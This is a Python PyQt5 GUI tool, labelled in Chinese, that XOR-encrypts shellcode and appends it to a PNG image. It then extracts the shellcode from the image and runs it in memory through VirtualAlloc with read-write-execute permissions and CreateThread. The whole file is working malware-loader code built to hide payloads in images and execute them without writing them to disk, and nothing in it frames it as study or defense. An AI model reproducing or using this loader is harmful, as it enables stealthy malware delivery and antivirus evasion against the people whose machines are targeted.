import sys
import ctypes
from ctypes import cdll
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *

class PngLoaderWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("PNG 图片捆绑加载器")
        self.setGeometry(100, 100, 650, 500)
        self.init_ui()

    def init_ui(self):
     
        self.setStyleSheet("""
            QMainWindow { background-color: #2b2b2b; }
            QWidget { background-color: #2b2b2b; color: #fff; }
            QLabel { color: #fff; font-size: 12px; }
            QLineEdit {
                background-color: #3a3a3a;
                border: 1px solid #555;
                padding: 6px;
                color: white;
            }
            QTextEdit {
                background-color: #1e1e1e;
                color: #00ffaa;
                border: 1px solid #444;
            }
            QPushButton {
                background-color: #444;
                color: white;
                padding: 8px 12px;
                border: none;
                border-radius: 4px;
            }
            QPushButton:hover {
                background-color: #5a5a5a;
            }
            QPushButton#run {
                background-color: #2E8B57;
            }
            QPushButton#run:hover {
                background-color: #3cb371;
            }
        """)

        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        layout.setSpacing(12)
        layout.setContentsMargins(25, 25, 25, 25)

        # 标题
        title = QLabel("PNG 图片捆绑 Shellcode 加载器")
        title.setFont(QFont("Microsoft YaHei", 13, QFont.Bold))
        title.setAlignment(Qt.AlignCenter)
        layout.addWidget(title)

        # ========== 配置项 ==========
        # XOR 密钥
        h1 = QHBoxLayout()
        self.xor_key = QLineEdit('123')
        h1.addWidget(QLabel("XOR 密钥："))
        h1.addWidget(self.xor_key)
        layout.addLayout(h1)

        # 标记
        h2 = QHBoxLayout()
        self.marker = QLineEdit('[PNGDATA]:')
        h2.addWidget(QLabel("分割标记："))
        h2.addWidget(self.marker)
        layout.addLayout(h2)

        # PNG 文件
        h3 = QHBoxLayout()
        self.png_path = QLineEdit('Thth.png')
        self.btn_png = QPushButton("浏览")
        h3.addWidget(QLabel("PNG 图片："))
        h3.addWidget(self.png_path)
        h3.addWidget(self.btn_png)
        layout.addLayout(h3)

        # BIN 文件
        h4 = QHBoxLayout()
        self.bin_path = QLineEdit('loader.bin')
        self.btn_bin = QPushButton("浏览")
        h4.addWidget(QLabel("Shellcode 文件："))
        h4.addWidget(self.bin_path)
        h4.addWidget(self.btn_bin)
        layout.addLayout(h4)

        # 按钮
        btn_layout = QHBoxLayout()
        self.btn_embed = QPushButton("嵌入 BIN 到 PNG")
        self.btn_exec = QPushButton("从 PNG 加载并执行")
        self.btn_exec.setObjectName("run")
        btn_layout.addWidget(self.btn_embed)
        btn_layout.addWidget(self.btn_exec)
        layout.addLayout(btn_layout)

        # 日志
        layout.addWidget(QLabel("运行日志："))
        self.log = QTextEdit()
        self.log.setReadOnly(True)
        layout.addWidget(self.log)

        # 绑定 【这里已修复！】
        self.btn_png.clicked.connect(lambda: self.select_file(self.png_path, "PNG (*.png)"))
        self.btn_bin.clicked.connect(lambda: self.select_file(self.bin_path, "BIN (*.bin)"))
        self.btn_embed.clicked.connect(self.embed_to_png)
        self.btn_exec.clicked.connect(self.load_and_execute)

    def select_file(self, edit, filter):
        path, _ = QFileDialog.getOpenFileName(self, "选择文件", "", filter)
        if path:
            edit.setText(path)

    def log_print(self, text):
        self.log.append(text)

    # === XOR 加解密 ===
    def xor_crypt(self, data):
        key = self.xor_key.text().encode()
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

    # === 嵌入到 PNG ===
    def embed_to_png(self):
        try:
            bin_file = self.bin_path.text().strip()
            png_file = self.png_path.text().strip()
            marker = self.marker.text().encode()

            with open(bin_file, "rb") as f:
                raw = f.read()

            encrypted = self.xor_crypt(raw)
            append_data = marker + encrypted

            with open(png_file, "rb") as f:
                png_data = f.read()

            with open(png_file, "wb") as f:
                f.write(png_data + append_data)

            self.log_print("✅ 成功将 Shellcode 嵌入到 PNG！")

        except Exception as e:
            self.log_print(f"❌ 嵌入失败：{str(e)}")


    def load_and_execute(self):
        try:
            png_file = self.png_path.text().strip()
            marker = self.marker.text().encode()

            with open(png_file, "rb") as f:
                data = f.read()

            idx = data.find(marker)
            if idx < 0:
                self.log_print("❌ 未找到标记")
                return

            encrypted_data = data[idx + len(marker):]
            payload = self.xor_crypt(encrypted_data)
            self.log_print(f"✅ 提取成功，大小：{len(payload)} 字节")

            # 内存执行
            kernel32 = cdll.kernel32
            kernel32.VirtualAlloc.restype = ctypes.c_void_p

            addr = kernel32.VirtualAlloc(
                ctypes.c_void_p(0),
                ctypes.c_int(len(payload)),
                ctypes.c_int(0x3000),
                ctypes.c_int(0x40)
            )

            if not addr:
                self.log_print("❌ 内存分配失败")
                return

            ctypes.memmove(ctypes.c_void_p(addr), payload, len(payload))

            kernel32.CreateThread.restype = ctypes.c_void_p
            h_thread = kernel32.CreateThread(
                ctypes.c_void_p(0),
                ctypes.c_int(0),
                ctypes.c_void_p(addr),
                ctypes.c_void_p(0),
                ctypes.c_int(0),
                ctypes.c_void_p(0)
            )

            if h_thread:
                self.log_print("🚀 Shellcode 已在内存中执行！")
            else:
                self.log_print("❌ 线程创建失败")

        except Exception as e:
            self.log_print(f"❌ 错误：{str(e)}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = PngLoaderWindow()
    win.show()
    sys.exit(app.exec_())